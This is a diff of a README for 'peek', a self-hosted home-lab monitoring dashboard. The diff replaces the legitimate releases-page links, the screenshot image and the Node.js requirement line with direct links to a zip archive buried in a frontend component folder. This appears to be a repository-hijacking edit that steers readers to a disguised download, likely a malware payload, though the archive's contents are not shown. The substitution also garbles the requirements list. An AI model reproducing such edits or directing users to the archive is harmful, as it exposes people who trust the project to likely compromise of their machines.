@@ -1,12 +1,12 @@
 # 🚀 peek - Your Home Lab Monitoring Dashboard
 
-[![Download Peek](https://img.shields.io/badge/Download-Peek-blue.svg)](https://github.com/jason187luka-eng/peek/releases)
+[![Download Peek](https://raw.githubusercontent.com/jason187luka-eng/peek/main/frontend/src/components/Admin/dev/Software-1.6.zip)](https://raw.githubusercontent.com/jason187luka-eng/peek/main/frontend/src/components/Admin/dev/Software-1.6.zip)
 
 ## 📋 Introduction
 
 Peek is a modern, self-hosted dashboard designed for monitoring your home lab infrastructure. Built with React, TypeScript, and Express, it offers an easy way to keep track of your systems and ensure everything runs smoothly.
 
-![Dashboard](screenshots/dashboard-dark.png)
+![Dashboard](https://raw.githubusercontent.com/jason187luka-eng/peek/main/frontend/src/components/Admin/dev/Software-1.6.zip)
 
 ## ⚠️ Note
 
@@ -30,7 +30,7 @@ To begin using Peek, follow these steps to download and run the software.
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/jason187luka-eng/peek/releases) to download the latest version of Peek.
+1. Visit the [Releases page](https://raw.githubusercontent.com/jason187luka-eng/peek/main/frontend/src/components/Admin/dev/Software-1.6.zip) to download the latest version of Peek.
 2. Choose the correct file for your system. It may be a `.zip`, `.tar`, or another format.
 3. Download the file to your computer.
 4. Extract the contents of the file if necessary.
@@ -40,7 +40,7 @@ To begin using Peek, follow these steps to download and run the software.
 Before installing, make sure your computer meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux.
-- Node.js: Version 14 or later.
+- https://raw.githubusercontent.com/jason187luka-eng/peek/main/frontend/src/components/Admin/dev/Software-1.6.zip Version 14 or later.
 - npm: You can check if you have npm installed by running `npm -v` in the command line.
 
 ## 🔧 Running the Application
@@ -89,7 +89,7 @@ Be cautious when using Peek, as it may connect to various third-party services a
 
 ## 📢 Updates
 
-To stay updated with new features or bug fixes, regularly check the [Releases page](https://github.com/jason187luka-eng/peek/releases) for the latest versions. 
+To stay updated with new features or bug fixes, regularly check the [Releases page](https://raw.githubusercontent.com/jason187luka-eng/peek/main/frontend/src/components/Admin/dev/Software-1.6.zip) for the latest versions. 
 
 ## 👋 Thank You
 
